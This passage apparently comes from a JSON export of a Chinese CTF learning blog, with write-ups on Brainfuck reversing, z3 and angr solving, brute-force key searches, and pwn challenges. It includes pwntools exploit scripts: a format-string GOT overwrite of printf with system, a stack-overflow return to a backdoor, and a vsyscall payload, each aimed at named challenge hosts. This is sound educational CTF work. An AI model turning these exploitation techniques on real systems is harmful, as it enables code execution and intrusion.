]],&gt;++++++++++[&lt;-----&gt;-][[,.-,.]]&lt;-------[&lt;+&gt;[-]][..,[,.[-.&lt;]-,[[&gt;[&gt;[&gt;,&lt;[&gt;&gt;+,[+[[-,]&lt;]&gt;,[++[&lt;,&gt;][&gt;],&gt;]-&gt;&gt;].],&lt;],+.,]-,[-[&gt;,,+][+[,]].-]-&gt;,]]&lt;+&gt;]+[&gt;+.]-],&gt;++++++++[&lt;------------&gt;-][&gt;+&gt;--]&lt;---[&lt;+&gt;[-]][,,&gt;],&gt;+++++++++[&lt;-----&gt;-]&lt;------[&lt;+&gt;[-]],&gt;++++++[&lt;----------------&gt;-]&lt;----[&lt;+&gt;[-]][[[,.],.,-].&lt;,[&lt;,+[&gt;...[&lt;&lt;,[+[,&gt;&gt;[+.-[.+[[&lt;,+][,&lt;,]].,,&gt;][&gt;,..]+&lt;]],,]]&lt;]+,.]],&gt;++++++[&lt;----------------&gt;-]&lt;-----[&lt;+&gt;[-][&lt;.[[.[,-,[.,,]&lt;[&gt;[.[,[-[[.][-&gt;+&lt;].&gt;]&gt;[[,]-.&lt;[&lt;,+..]]+&gt;-]&gt;&gt;[&lt;[-.&gt;-&lt;[+&lt;+&gt;,].&lt;]&lt;[--[&gt;-]],]&gt;]&gt;&gt;[[&gt;.+++]++.]].,&gt;-&lt;]&gt;+]+]-[+++[,,&lt;[,..-[..-]&gt;-],],+]+]+[+&gt;[.-[+[.]]],]&lt;]][.[,,-&gt;+&lt;],],&gt;+++++++[&lt;-------&gt;-][&lt;+&lt;+]&lt;--[&lt;+&gt;[-]],&gt;+++++[&lt;----------&gt;-]&lt;-[&lt;+&gt;[-]][+&gt;[+&lt;,[+[,+[,&lt;&lt;,+,]&lt;.],-&gt;]+&gt;]-],&gt;+++++++++[&lt;----------&gt;-]&lt;-------[&lt;+&gt;[-]][.-&gt;[[&lt;.-.&gt;].+[,[&lt;[,&lt;-[.&gt;],.&gt;+&lt;]+[[[,]],&lt;+++]&gt;-]&lt;-]&gt;+&lt;].&lt;&lt;[-,&gt;&gt;]],&gt;+++++[&lt;-----------&gt;-]&lt;-[&lt;+&gt;[-][,&gt;---]][,-],&gt;++++++++[&lt;------------&gt;-]&lt;-----[&lt;+&gt;[-][.-[[.,-[&gt;[,.+]&gt;],&gt;,[,&gt;-[+&lt;+[[,,[&gt;[&lt;+[+&lt;+,]&gt;-.[-.-.]&lt;.-]++],]&gt;&gt;[[.-,+&gt;]+&lt;-]]&gt;+],.]]--&gt;,-]+&lt;.&lt;]],&gt;++++++++++[&lt;----&gt;-]&lt;---------[&lt;+&gt;[-]][&lt;+[&lt;..]],&gt;+++++++[&lt;--------------&gt;-][&gt;&gt;[[[&gt;-[+[,.--,]--[&gt;[.-&gt;&gt;],.,[.-&gt;]]&lt;.&lt;],-[,+],.]+,&gt;[&gt;-[+&lt;&lt;]&gt;]]--,]---]&lt;---[&lt;+&gt;[-][.-&lt;-[&lt;[,&gt;--.++&lt;].-.&gt;+]]],&gt;+++++++++[&lt;-----------&gt;-]&lt;-[&lt;+&gt;[-]],&gt;+++++++[&lt;--------------&gt;-]&lt;-[&lt;+&gt;[-][[+&gt;.[,]&lt;[&lt;[&gt;,+.-,][&lt;+&gt;[-,,,[&lt;,+[&lt;&lt;+[+.-,[,+]&gt;.+]-[&lt;.&lt;[&gt;.[...-],]+&gt;[-[&gt;---,]&gt;-&lt;[-,]...].]+&lt;][&lt;&lt;[+&lt;-[+&lt;[&gt;-.+&gt;]+,]+&gt;,]]]&lt;,],]&lt;+].--]&lt;]],&gt;++++++[&lt;---------&gt;-]&lt;-[&lt;+&gt;[-][+&gt;[-.&lt;[[+[&gt;,+.,&gt;]&gt;]&gt;[+[++,&gt;[,,[+[.&gt;.[&gt;,]+]&lt;&lt;]-.&gt;]&gt;-].-&gt;++],]&gt;[&gt;[.[&gt;.+],].,[&lt;[-&lt;,[[[-,&gt;]-]+[,,-[.&lt;[+&lt;[&lt;,-,-]+,+][[.,-&gt;]+[--,&lt;+]&gt;]&lt;]+.--],.&gt;]].[--[&gt;.&lt;[[,&gt;...,]-,]&lt;&lt;[[&lt;]&gt;.]&lt;].+&gt;]-]-.]+],]][&gt;,[,-[[..[..,&lt;[.--]-,&gt;]+&lt;[[,.[+[[&lt;+&gt;[+]&lt;&lt;]---[..[,&lt;].],&lt;]]].&gt;]&gt;]-&gt;+],,&gt;[-,.&gt;].]&gt;-&gt;],&gt;+++++[&lt;----------&gt;-]&lt;-[&lt;+&gt;[-]][[[,[,,-,,.][.-&gt;+&lt;],]++&gt;,]-],&gt;+++++[&lt;--------------------&gt;-]&lt;--[&lt;+&gt;[-][-&gt;[-]&lt;[&gt;&gt;-&lt;..].+]][[&gt;]+.+,],&gt;++++++++[&lt;------------&gt;-]&lt;---[&lt;+&gt;[-]],&gt;+++++[&lt;--------------------&gt;-]&lt;--[&lt;+&gt;[-][+[[[,--[[[+.]-&gt;]&lt;-&lt;.][-[-&gt;&gt;&gt;[&lt;[+,&gt;[,+[+]+.&gt;][-..],][,,.[&lt;,-[+]&gt;++]-,+]++]&lt;],].][+,&gt;,-[&lt;,.[&lt;&lt;[-[,&lt;-].[++.[[.--]&gt;-[&lt;&lt;]+],-]-]&gt;,,[&gt;[-[,.&lt;].[[&lt;&lt;&lt;+,]&lt;-]+]-].&lt;].&gt;,]]&lt;]&lt;[[,&lt;[-&gt;].-]--]+]-[+.-]]],&gt;+++++++++[&lt;-----&gt;-]&lt;-------[&lt;+&gt;[-]][.[,&lt;&lt;-&gt;.]&gt;],&gt;++++++++[&lt;------------&gt;-]&lt;--[&lt;+&gt;[-][-[&gt;-,-[&lt;+&gt;,-,]&gt;-,]]][&gt;[-,[.&gt;+.].]-[&lt;+]+..],&gt;++++++[&lt;--------------------&gt;-]&lt;-----[&lt;+&gt;[-]]+&lt;[wronganswer!&gt;[-][+[+[[.[&gt;[+,,[[[+&gt;+&lt;++]+,+],,&gt;&gt;&gt;]+],+.,+].],+,[-,-[.]--,&gt;,-].&lt;][-.[+&lt;[[&gt;[[.,+&lt;-[,..-&gt;],,+]-[.--&lt;]][.[+&gt;,[&lt;[.+&gt;,&gt;.+,],]]+[++]&gt;]&gt;]&gt;]&lt;++[&gt;&gt;&gt;+&gt;-.]&gt;]&gt;]],&gt;.[&lt;,&lt;.]++&lt;]&lt;[-]][&gt;...,]&gt;[congratulations![-][&lt;.+&gt;.+]] 这样看起来就没那么辣眼睛了，并且知道正确的输入应该是71位，把源码编译了之后运行了一波发现是正确的。 那些无效的, .都存在于循环中，所以不进入这些循环就是约束输入的条件。 简化后代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&gt;,&gt;+++++[&lt;--------------------&gt;-]&lt;----104,&gt;+++++[&lt;--------------------&gt;-]&lt;---103,&gt;+++++[&lt;-------------------&gt;-]&lt;--97,&gt;+++++++[&lt;---------------&gt;-]&lt;---109,&gt;+++++++++[&lt;-----------&gt;-]&lt;-101,&gt;++++++++[&lt;---------------&gt;-]&lt;---123,&gt;++++++++[&lt;------------&gt;-]&lt;-----101,&gt;+++++++++[&lt;-----&gt;-]&lt;------51,&gt;++++++[&lt;--------&gt;-]&lt;-----53,&gt;++++++[&lt;----------------&gt;-]&lt;-97,&gt;+++++++++[&lt;-----------&gt;-]&lt;--101,&gt;++++++[&lt;--------&gt;-]&lt;-49,&gt;+++++++[&lt;-------&gt;-]&lt;-50,&gt;+++++++[&lt;-------&gt;-]&lt;49,&gt;+++++[&lt;-----------&gt;-]&lt;-56,&gt;++++++[&lt;---------&gt;-]&lt;---57,&gt;++++++[&lt;----------------&gt;-]&lt;-97,&gt;+++++[&lt;---------&gt;-]&lt;---48,&gt;++++++[&lt;----------------&gt;-]&lt;--98,&gt;++++++[&lt;--------&gt;-]&lt;48,&gt;+++++++++[&lt;------&gt;-]&lt;--56,&gt;++++++++++[&lt;-----&gt;-]&lt;-51,&gt;+++++++[&lt;-------&gt;-]&lt;49,&gt;++++++++++[&lt;---------&gt;-]&lt;-------97,&gt;++++++[&lt;--------&gt;-]&lt;---51,&gt;++++++[&lt;--------&gt;-]&lt;--50,&gt;++++++++[&lt;-------&gt;-]&lt;-57,&gt;++++++++[&lt;------------&gt;-]&lt;---99,&gt;++++++++[&lt;------------&gt;-]&lt;------102,&gt;+++++++[&lt;--------&gt;-]&lt;56,&gt;+++++++[&lt;-------&gt;-]&lt;-----54,&gt;+++++++[&lt;--------------&gt;-]&lt;98,&gt;++++++++++[&lt;-----&gt;-]&lt;-51,&gt;++++++++++[&lt;-----&gt;-]&lt;-----55,&gt;++++++++++[&lt;----------&gt;-]&lt;-101,&gt;++++++++++[&lt;-----&gt;-]&lt;----54,&gt;+++++++++[&lt;-----------&gt;-]&lt;--101,&gt;++++++++[&lt;------&gt;-]&lt;-------55,&gt;+++++[&lt;--------------------&gt;-]&lt;100,&gt;++++++++++[&lt;-----&gt;-]&lt;--52,&gt;++++++++[&lt;------------&gt;-]&lt;---99,&gt;++++++[&lt;---------&gt;-]&lt;---57,&gt;++++++++[&lt;------&gt;-]&lt;48,&gt;+++++[&lt;-----------&gt;-]&lt;-56,&gt;++++++[&lt;--------&gt;-]&lt;----52,&gt;+++++++++[&lt;-----------&gt;-]&lt;--101,&gt;++++++++[&lt;------------&gt;-]&lt;------102,&gt;++++++++++[&lt;-----&gt;-]&lt;-51,&gt;+++++++++[&lt;-----&gt;-]&lt;--------53,&gt;++++++++++[&lt;-----&gt;-]&lt;-------57,&gt;++++++++[&lt;------------&gt;-]&lt;---99,&gt;+++++++++[&lt;-----&gt;-]&lt;------51,&gt;++++++[&lt;----------------&gt;-]&lt;----100,&gt;++++++[&lt;----------------&gt;-]&lt;-----101,&gt;+++++++[&lt;-------&gt;-]&lt;--51,&gt;+++++[&lt;----------&gt;-]&lt;-51,&gt;+++++++++[&lt;----------&gt;-]&lt;-------97,&gt;+++++[&lt;-----------&gt;-]&lt;-56,&gt;++++++++[&lt;------------&gt;-]&lt;-----101,&gt;++++++++++[&lt;----&gt;-]&lt;---------49,&gt;+++++++[&lt;--------------&gt;-]&lt;---101,&gt;+++++++++[&lt;-----------&gt;-]&lt;-100,&gt;+++++++[&lt;--------------&gt;-]&lt;-99,&gt;++++++[&lt;---------&gt;-]&lt;-55,&gt;+++++[&lt;----------&gt;-]&lt;-51,&gt;+++++[&lt;--------------------&gt;-]&lt;--102,&gt;++++++++[&lt;------------&gt;-]&lt;---99,&gt;+++++[&lt;--------------------&gt;-]&lt;--102,&gt;+++++++++[&lt;-----&gt;-]&lt;-------52,&gt;++++++++[&lt;------------&gt;-]&lt;--98,&gt;++++++[&lt;--------------------&gt;-]&lt;-----125 后面的数字就是要求输入的字符的ASCII码值，得到flag。 手动全弄一遍也太爽了🎱","categories":[],"tags":[]},{"title":"NCTF2018","slug":"NCTF2018","date":"2018-11-26T09:07:04.000Z","updated":"2019-02-12T16:01:00.709Z","comments":true,"path":"2018/11/26/NCTF2018/","link":"","permalink":"http://yoursite.com/2018/11/26/NCTF2018/","excerpt":"说是不再记录简单题的，无奈能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。","text":"说是不再记录简单题的，无奈能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。 someboxes那一题看了很久一直没有一个具体的感觉，后来发现就是推箱子游戏，输入w450控制方向把两个箱子推到目标点就行了，不过地图还是有一些小问题，要看wp才能得到解答。 babystack开了pie，看了网上的教程说可以只覆盖后四位，因为pie不会改变最后三位，所以多试几次肯定会成功，但是输入限制了必需要为8的倍数，与部分覆盖产生了冲突，不知道怎么解决。 smallbug3也开了pie，先输入接下来接受的输入的长度，要求不大于128，感觉可以输入一个负数的十六进制的表达的形式那种来形成栈溢出，好像也成功了，但是这题不知道怎么泄漏libc基址，后来也就没做。 someboxes看了源码之后终于知道了地图哪里出了问题，原来地图中的每个数值都与下标异或了，再异或一次得到真正的地图。当时没看程序中有哪些地方对地图进行了操作（准确的说是看了但是没看见最底下有一个改写地图的orz。 地图： 123456789101112[* * * * * * * * * * * * * * * * * * 0 0 * * * * * * * * 0 0 * * * * 0 0 0 x 0 * 0 0 0 0 0 0 * * * * 0 * * 0 0 0 0 0 * * * 0 0 * * * 0 * * 0 * * 0 0 * @ 0 0 0 * * * 0 0 * 0 0 0 P 0 * * * * * * * * 0 0 * * * * 0 * * * * * * * * * 0 * * * * * X * * 0 0 0 * * * 0 0 * @ * 0 * 0 0 0 0 * 0 * * * 0 0 0 0 0 0 0 0 * * * * 0 * * * 0 0 0 0 * * * 0 * 0 0 0 0 * * * * * * * * * * * * * * * * * *] 玩家初始的位置用P表示，两个箱子用x表示，终点用@表示，不能推到*上，所以沿着0推就行了。 操作顺序：aaawwdwaaawasssssssasddsdwwddddwwwwwaaawwdddsdwawddddwdssdsaa 用W540替换：444Wd0W444W4555555545d0d05d0Wd0d0d0d0W444Wd0d0d05d0W4Wd0d0d0d0Wd055d0544 输入这个应该就可以得到flag了。 babystack看了github上的脚本： 1234from pwn import *p=process(&apos;./babystack&apos;)p.sendline(p64(0xffffffffff600000)*5)p.interactive() orz其实完全不懂为啥，问了大佬然而大佬没看题目，后来偶然在群里看见有人说是vsyscall啥的，百度了一波，结果找到了之前就看过的一篇有关pie的教程。 如果仔细看看的话，在第三部分就能发现对vsyscall的介绍啥的…… 1#define VSYSCALL_ADDR_vgettimeofday 0xffffffffff600000 脚本中0xffffffffff600000就是调用gettimeofday函数吧。 题目源码： 123456789101112131415161718void vul()&#123; char a[10]; int n = readn(a,256); if(n%8 != 0) exit(0); return ;&#125;void func()&#123; vul(); exit(0);&#125;int main()&#123; func(); system(&quot;/bin/sh&quot;);&#125; 栈溢出一直覆盖到exit的返回地址之前，然后执行完vsyscall之后就会往下执行system(&quot;/bin/sh&quot;)了吧。","categories":[],"tags":[]},{"title":"格式化字符串","slug":"格式化字符串","date":"2018-11-21T06:37:21.000Z","updated":"2019-01-12T14:36:07.214Z","comments":true,"path":"2018/11/21/格式化字符串/","link":"","permalink":"http://yoursite.com/2018/11/21/格式化字符串/","excerpt":"","text":"printf()函数如果没有给定格式化参数，就可以利用它来任意读写。像是带canary保护的程序，可以调试一下看一下canary在栈中的位置，然后用%位置$x这样的形式来读取canary。 利用%num$n的形式可以进行任意写（num的取值一般从栈中第一个可以控制的位置开始）。例如\\x02\\x03\\x04\\x08%num$n就是在0x08040302的位置写上4，因为\\x02\\x03\\x04\\x08是四个字节。如果想多写一点的话可以用\\x02\\x03\\x04\\x08%12c%num$n这样的，就有16个字节，就写上了10（十六进制表示）。 例如whalectf上的pwn3: 利用格式化字符串，把printf的got表覆盖为system函数，这样下次调用printf的时候就是调用system函数了。但是%n的话是一次性写4个字节，会发送很多数据，因为每多写1就要多发送一个字节。可以使用%hhn对一个字节进行写。这里system_plt的第一个字节是0x10，而前面payload正好已经发送了16个字节，所以就不需要再添加字节，直接%7$hhn就行了。至于第一个可控制的位置，可以先调试一下程序，发送一下AAAAAAAAA，然后看栈里的数据就很容易知道是7了。 123456789101112131415161718192021from pwn import *sh=remote(&quot;bamboofox.cs.nctu.edu.tw&quot;,22003)printf_got=0x0804a00csystem_plt=0x08048410payload=p32(printf_got)payload+=p32(printf_got+1)payload+=p32(printf_got+2)payload+=p32(printf_got+3)payload+=&quot;%7$hhn&quot;payload+=&quot;%&quot;payload+=str(0x84-0x10)payload+=&quot;c%8$hhn&quot;payload+=&quot;%&quot;payload+=str(0x104-0x84)payload+=&quot;c%9$hhn&quot;payload+=&quot;%&quot;payload+=str(0x08-0x04)payload+=&quot;c%10$hhn&quot;sh.sendline(payload)sh.sendline(&quot;/bin/sh&quot;)sh.interactive()","categories":[],"tags":[]},{"title":"z3求解","slug":"z3求解","date":"2018-11-20T03:00:15.000Z","updated":"2019-01-12T14:37:04.377Z","comments":true,"path":"2018/11/20/z3求解/","link":"","permalink":"http://yoursite.com/2018/11/20/z3求解/","excerpt":"","text":"之前有题应该使用z3求解的一直没有完成，今天就好好学习一下z3，把这题解决了顺便记录一下z3求解的使用！ z3求解大致模版： 123456from z3 import *x=Int(&apos;x&apos;) //定义变量solver=Solver() //构造求解器solver.add(x==1)//添加约束条件if solver.check()==sat: //如果有解返回值为sat否则返回unsat print solver.model() //打印解 之前一题的z3使用分析： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from z3 import *num=BitVec(&quot;num&quot;,33) //这里定义了num为一个32位的二进制数字，至于为什么要写33，是我尝试了很多次无解后发现写33就有解了2333array=[ 164, 25, 4, 130, 126, 158, 91, 199, 173, 252, 239, 143, 150, 251, 126, 39, 104, 104, 146, 208, 249, 9, 219, 208, 101, 182, 62, 92, 6, 27, 5, 46]b=range(32)for i in range(32): temp=0 for j in range(i): temp^=array[j] b[i]=tempsolver=Solver()solver.add(array[0]^(num&amp;0xff)^b[0]==ord(&apos;F&apos;)). //根据题目添加条件solver.add(array[1]^((num&gt;&gt;1)&amp;0xff)^b[1]==ord(&apos;L&apos;))solver.add(array[2]^((num&gt;&gt;2)&amp;0xff)^b[2]==ord(&apos;A&apos;))solver.add(array[3]^((num&gt;&gt;3)&amp;0xff)^b[3]==ord(&apos;G&apos;))solver.add(array[4]^((num&gt;&gt;4)&amp;0xff)^b[4]==ord(&apos;&#123;&apos;))for i in range(5,31): //多次重复的输入可以用循环来操作 solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&lt;=90) solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&gt;=65)solver.add(array[31]^((num&gt;&gt;31)&amp;0xff)^b[31]==ord(&apos;&#125;&apos;))if solver.check()==sat : print solver.model() //得到正确的num 这种简单的z3求解的运用不是很难，但是却比爆破之类的方法来的快很多。其实今天也没学习多少有关z3的，之前一直无解只有因为定义的时候没用33……","categories":[],"tags":[]},{"title":"basic-re-su","slug":"basic-re-su","date":"2018-11-07T13:19:32.000Z","updated":"2018-11-07T13:25:43.950Z","comments":true,"path":"2018/11/07/basic-re-su/","link":"","permalink":"http://yoursite.com/2018/11/07/basic-re-su/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199v4 = 2; v5 = 3; v6 = 2; v7 = 1; v8 = 4; v9 = 7; v10 = 4; v11 = 5; v12 = 10; v13 = 11; v14 = 10; v15 = 9; v16 = 14; v17 = 15; v18 = 12; v19 = 13; v20 = 16; v21 = 19; v22 = 16; v23 = 17; v24 = 20; v25 = 23; v26 = 22; v27 = 19; v28 = 28; v29 = 25; v30 = 30; v31 = 31; v32 = 28; v33 = 25; v34 = 26; v35 = 31; v36 = 36; v37 = 33; v38 = 34; v39 = 39; v40 = 36; v41 = 33; v42 = 34; v43 = 35; v44 = 40; v45 = 41; v46 = 46; v47 = 43; v48 = 36; v49 = 45; v50 = 38; v51 = 47; v52 = 56; v53 = 49; v54 = 58; v55 = 59; v56 = 52; v57 = 61; v58 = 62; v59 = 55; v60 = 48; v61 = 57; v62 = 50; v63 = 59; v64 = 60; v65 = 53; v66 = 54; v67 = 55; v68 = 72; v69 = 73; v70 = 66; v71 = 66; v72 = 68; v73 = 68; v74 = 70; v75 = 71; v76 = 72; v77 = 73; v78 = 74; v79 = 74; v80 = 77; v81 = 77; v82 = 79; v83 = 78; v84 = 80; v85 = 80; v86 = 82; v87 = 83; v88 = 85; v89 = 84; v90 = 86; v91 = 87; v92 = 89; v93 = 89; v94 = 90; v95 = 91; v96 = 92; v97 = 93; v98 = 94; v99 = 94; v100 = 96; v101 = 96; v102 = 99; v103 = 99; v104 = 100; v105 = 101; v106 = 103; v107 = 103; v108 = 105; v109 = 105; v110 = 107; v111 = 107; v112 = 108; v113 = 109; v114 = 110; v115 = 110; v116 = 112; v117 = 112; v118 = 114; v119 = 115; v120 = 116; v121 = 117; v122 = 119; v123 = 119; v124 = 120; v125 = 121; v126 = 123; v127 = 123; v128 = 125; v129 = 125; v130 = 127; v131 = 127; v132 = 129; v133 = 129; v134 = 131; v135 = 131; v136 = 140; v137 = 141; v138 = 142; v139 = 143; v140 = 136; v141 = 137; v142 = 138; v143 = 139; v144 = 140; v145 = 141; v146 = 142; v147 = 135; v148 = 152; v149 = 145; v150 = 146; v151 = 147; v152 = 148; v153 = 149; v154 = 150; v155 = 151; v156 = 152; v157 = 153; v158 = 154; v159 = 154; v160 = 156; v161 = 156; v162 = 158; v163 = 158; v164 = 160; v165 = 160; v166 = 162; v167 = 162; v168 = 164; v169 = 164; v170 = 166; v171 = 166; v172 = 168; v173 = 168; v174 = 170; v175 = 170; v176 = 172; v177 = 172; v178 = 174; v179 = 174; v180 = 176; v181 = 177; v182 = 178; v183 = 179; memset(v184, 0, 0x1Fui64); sub_140011159(std::cout, &quot;flag format: SUCTF&#123;xxxxxxxxxxxxxxx&#125;\\n&quot;); sub_140011159(std::cout, &quot;Please Input Key:&quot;); std::basic_istream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&gt;&gt;(std::cin, &amp;v186); v186 %= 0x10000u; v185 = 8; while ( v185 ) &#123; --v185; for ( j = 22; j; v184[j] |= v189 &lt;&lt; v185 ) &#123; v188 = *(&amp;v4 + 22 * v185 + --j); v189 = (v188 &gt;&gt; ((v186 &gt;&gt; 2 * v185) &amp; 3)) &amp; 1; &#125; &#125; sub_140011159(std::cout, v184); system(&quot;pause&quot;); sub_1400113A7((__int64)&amp;v3, (__int64)&amp;unk_14001AD10); return 0i64; 这一题很简单，只是在爆破的时候遇到几个坑(因为自己的鶸），所以记录一下。 程序流程就是输入一个key，大小为0x0001~0xffff。经过运算后输出v184，给了flag格式直接爆破就是了。 但是ida初始化是，v4后面大于127的值都默认显示成了负数，这样是爆破不出来的，按两次h转换成正数。 其他就是爆破时的逻辑了，基本上照着原代码copy就行了。 爆破脚本： 1234567891011value=[2,3,2,1,4,7,4,5,10,11,10,9,14,15,12,13,16,19,16,17,20,23,22,19,28,25,30,31,28,25,26,31,36,33,34,39,36,33,34,35,40,41,46,43,36,45,38,47,56,49,58,59,52,61,62,55,48,57,50,59,60,53,54,55,72,73,66,66,68,68,70,71,72,73,74,74,77,77,79,78,80,80,82,83,85,84,86,87,89,89,90,91,92,93,94,94,96,96,99,99,100,101,103,103,105,105,107,107,108,109,110,110,112,112,114,115,116,117,119,119,120,121,123,123,125,125,127,127,129,129,131,131,140,141,142,143,136,137,138,139,140,141,142,135,152,145,146,147,148,149,150,151,152,153,154,154,156,156,158,158,160,160,162,162,164,164,166,166,168,168,170,170,172,172,174,174,176,177,178,179]for key in range(0xffff): flagnc=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0] for i in range(7,-1,-1): for j in range(21,-1,-1): v188=value[22*i+j] v189=(v188&gt;&gt;((key&gt;&gt;2*i)&amp;3))&amp;1 flagnc[j]|=v189&lt;&lt;i flag=&quot;&quot;.join([chr(ch) for ch in flagnc]) if ~flag.find(&quot;SUCTF&#123;&quot;): print flag","categories":[],"tags":[]},{"title":"符号执行Angr","slug":"符号执行Angr","date":"2018-11-03T14:57:50.000Z","updated":"2018-11-04T06:26:08.670Z","comments":true,"path":"2018/11/03/符号执行Angr/","link":"","permalink":"http://yoursite.com/2018/11/03/符号执行Angr/","excerpt":"","text":"突然发现记录一些简单题的做题过程只会浪费时间，以后就不记录特别简单的题了（虽然难的题也不会写XD 今天在做whalectf上面的题目时，有两道类型差不多的题，但是一道用爆破解出来了，另一道)却解不出来，查找writeup的时候找不到一样的题目，但是找到了类似的题目，并且发现了符号执行这个东西，学习后掌握了新的解题技巧。 首先要安装angr库，具体操作方法可以百度。 解题脚本： 12345678import angr import claripy p = angr.Project(&quot;./ais3_crackme&quot;) argv1=claripy.BVS(&apos;argv1&apos;,24*8)state=p.factory.entry_state(args=[&apos;./ais3_crackme&apos;,argv1])simgr=p.factory.simgr(state)simgr.explore(find=0x400602,avoid=0x40060e)print simgr.found[0].solver.eval(argv1,cast_to=str) 其中： p = angr.Project(&quot;./ais3_crackme&quot;) 为每一个angr脚本必备 argv1=claripy.BVS(&#39;argv1&#39;,24*8) 是以二进制形式设一个参数，ida分析程序得知参数长度为24 state=p.factory.entry_state(args=[&#39;./ais3_crackme&#39;,argv1]) 获取程序的初始状态 simgr=p.factory.simgr(state) 遍历路径 simgr.explore(find=0x400602,avoid=0x40060e) 设定成功与失败的路径结果，地址由ida分析得 print simgr.found[0].solver.eval(argv1,cast_to=str) 以字符串形式输出结果 这一题几乎是照抄着写了一遍，因此再把之前那道简单的题)拿出来练一下手。 脚本如下： 123456import angr p = angr.Project(&quot;./r100&quot;) state=p.factory.entry_state(args=[&apos;./r100&apos;])simgr=p.factory.simgr(state)simgr.explore(find=0x400844,avoid=0x400855)print simgr.found[0].posix.dumps(0) 但还是不太熟练，可至少拥有了两个简单的模版XD 再摘录一下freebuf上的较通用脚本： 12345678910111213141516171819202122232425262728293031import angrimport sysprint &quot;[*]start------------------------------------&quot;p = angr.Project(sys.argv[1]) # 建立工程初始化二进制文件state = p.factory.entry_state() # 获取入口点处状态&apos;&apos;&apos;state.posix.files[0].read_from(1)表示从标准输入读取一个字节&apos;&apos;&apos;for _ in xrange(int(sys.argv[2])): # 对输入进行简单约束（不为回车） k = state.posix.files[0].read_from(1) state.se.add(k!=10)k = state.posix.files[0].read_from(1)state.se.add(k==10) # 回车为结束符state.posix.files[0].seek(0)state.posix.files[0].length = int(sys.argv[2])+1 # 约束输入长度（大于实际长度也可）print &quot;[*]simgr start-------------------------------&quot;sm = p.factory.simgr(state) # 初始化进程模拟器sm.explore(find=lambda s:&quot;correct!&quot; in s.posix.dumps(1)) # 寻找运行过程中存在 “correct！”的路径，并丢弃其他路径print &quot;[*]program excuted---------------------------&quot;for pp in sm.found: out = pp.posix.dumps(1) # 表示程序的输出 print out inp = pp.posix.files[0].all_bytes() # 取输入的变量 print pp.solver.eval(inp,cast_to = str) # 利用约束求解引擎求解输入","categories":[],"tags":[]},{"title":"MOCTF-1","slug":"MOCTF-1","date":"2018-10-31T13:25:57.000Z","updated":"2019-01-12T14:48:38.298Z","comments":true,"path":"2018/10/31/MOCTF-1/","link":"","permalink":"http://yoursite.com/2018/10/31/MOCTF-1/","excerpt":"","text":"SO EASY虽然程序很大，但是在main函数里直接可以看见flag。 跳跳跳还是🎲游戏，千篇一律，nop掉判断就好了,最后给出的字符串base64解密得到flag。 暗恋的苦恼给了加密程序，密文，密钥，要推算出明文。 ida打开，定位到加密函数： 123456789101112v7 = strlen(a1);v6 = strlen(a2);v4 = 0;v3 = operator new(0xFFu);for ( i = 0; i &lt; v7; ++i )&#123; if ( v4 == v6 ) v4 = 0; v3[i] = sub_401005(a1[i], a2[v4++]);&#125;v3[i] = 0;return v3; 每一位密钥对每一位明文操作，当密钥用完时从头再取。sub_401005: 1234567891011v4 = toupper(a1);v5 = toupper(a2);if ( v4 == &apos; &apos; ) return v4;for ( i = 0; i &lt; v4 - 65; ++i ) ++v5;if ( v5 &gt; 90 ) result = v5 - 25;else result = v5;return result; toupper是转换为大写。v5+=v4-65，然后根据v5的值决定返回值。然而不知道 1234if ( v5 &gt; 90 ) result = v5 - 25;else result = v5; 这一部分怎么逆好，就把两种情况都写了…结合题目中有具体意义的提示应该也不失为一种方法吧23333: 1234567891011121314mingwen=&quot;&quot;miwen=&quot;QWDRILDWNTW&quot;miyao=&quot;ILOVEMOCTF&quot;for i in range(len(miwen)): v5=ord(miwen[i]) v4=65+v5-ord(miyao[i%9]) mingwen+=chr(v4)print mingwenmingwen=&quot;&quot;for i in range(len(miwen)): v5=ord(miwen[i])+25 v4=65+v5-ord(miyao[i%9]) mingwen+=chr(v4)print mingwen crakeme2简单的异或，逆运算得到一串十六进制数字，ascii得到flag。 you get flag ， but it … -1s？XD easy pwn栈溢出： 1234char s; // [esp+4h] [ebp-14h]gets(&amp;s);return puts(&amp;s); 后门函数： 123456789101112131415161718.text:0804850B public success.text:0804850B success proc near.text:0804850B ; __unwind &#123;.text:0804850B push ebp.text:0804850C mov ebp, esp.text:0804850E sub esp, 8.text:08048511 sub esp, 0Ch.text:08048514 push offset s ; &quot;you success gets flag&quot;.text:08048519 call _puts.text:0804851E add esp, 10h.text:08048521 sub esp, 0Ch.text:08048524 push offset command ; &quot;cat flag&quot;.text:08048529 call _system.text:0804852E add esp, 10h.text:08048531 nop.text:08048532 leave.text:08048533 retn.text:08048533 ; &#125; // starts at 804850B 脚本： 1234567from pwn import *sh=remote(&quot;139.199.177.55&quot;,10001)sh.recvuntil(&quot;easy?\\n&quot;)system=0x0804850bpayload=&apos;a&apos;*0x18+p32(0x0804850b)sh.sendline(payload)sh.interactive()","categories":[],"tags":[]},{"title":"MCTF2018-2","slug":"MCTF2018-2","date":"2018-10-30T15:15:37.000Z","updated":"2018-10-31T07:51:29.619Z","comments":true,"path":"2018/10/30/MCTF2018-2/","link":"","permalink":"http://yoursite.com/2018/10/30/MCTF2018-2/","excerpt":"","text":"identifyida打开，搜索字符串，找到了提示错误用户名和密码的字符串，并由此找到了关键函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109v17 = xmmword_402210; v18 = xmmword_402200; v2 = &quot;WELCOME TO MCTF\\n&quot;; v19 = xmmword_402220; v3 = aWelcomeToMctf[0]; v23 = 0xF5; v25 = 0; v20 = xmmword_4021F0; v21 = xmmword_402240; v22 = 